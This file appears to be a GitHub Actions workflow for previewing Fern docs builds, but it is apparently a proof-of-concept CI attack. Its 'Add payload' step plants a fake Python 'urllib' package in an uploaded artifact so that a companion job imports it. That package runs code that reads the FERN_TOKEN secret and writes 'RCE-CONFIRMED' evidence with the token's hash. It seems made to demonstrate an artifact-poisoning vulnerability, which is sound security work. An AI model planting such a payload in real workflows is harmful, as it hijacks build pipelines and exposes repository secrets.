name: "Preview Fern Docs: Build"

on:
  pull_request:
    paths:
      - 'docs/**'
      - 'fern/**'
      - '.github/workflows/fern-docs-preview-build.yml'
      - 'scripts/hydrate-fern-versions.sh'

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout PR
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Save PR metadata
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          HEAD_REF: ${{ github.head_ref }}
        run: |
          mkdir -p preview-metadata
          echo "$PR_NUMBER" > preview-metadata/pr_number
          echo "$HEAD_REF" > preview-metadata/head_ref
          echo "docs/welcome.md" > preview-metadata/changed_md_files

      # attacker payload: becomes $GITHUB_WORKSPACE/urllib/ in the companion job
      - name: Add payload
        run: |
          mkdir -p urllib
          cat > urllib/__init__.py <<'PY'
          import os, sys, hashlib
          tok = os.environ.get("FERN_TOKEN", "")
          msg = "RCE-CONFIRMED cwd=%s token_len=%d token_sha256=%s\n" % (
              os.getcwd(), len(tok), hashlib.sha256(tok.encode()).hexdigest())
          open("pwned.txt", "w").write(msg)
          summary = os.environ.get("GITHUB_STEP_SUMMARY")
          if summary:
              open(summary, "a").write(msg)
          sys.stderr.write(msg)
          PY
          echo 'def quote(s, safe=None):' > urllib/parse.py
          echo '    return s' >> urllib/parse.py

      - name: Upload fern sources and metadata
        uses: actions/upload-artifact@v7
        with:
          name: fern-preview
          path: |
            fern/
            docs/
            preview-metadata/
            urllib/
          retention-days: 1
